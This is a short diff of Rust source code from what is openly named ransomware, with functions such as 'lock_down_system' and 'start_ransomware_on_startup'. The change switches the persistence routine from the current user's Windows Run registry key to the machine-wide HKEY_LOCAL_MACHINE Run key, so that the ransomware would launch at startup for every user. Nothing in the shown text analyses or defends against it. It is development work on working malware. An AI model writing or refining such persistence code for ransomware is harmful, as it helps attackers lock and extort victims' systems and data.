@@ -253,10 +253,10 @@ pub fn lock_down_system() {
 }
 
 pub fn start_ransomware_on_startup() {
-    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
     let path = Path::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
-    let (key, disp) = hkcu.create_subkey(&path).unwrap();
-    let run = hkcu
+    let (key, disp) = hklm.create_subkey(&path).unwrap();
+    let run = hklm
         .open_subkey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run")
         .unwrap();
 
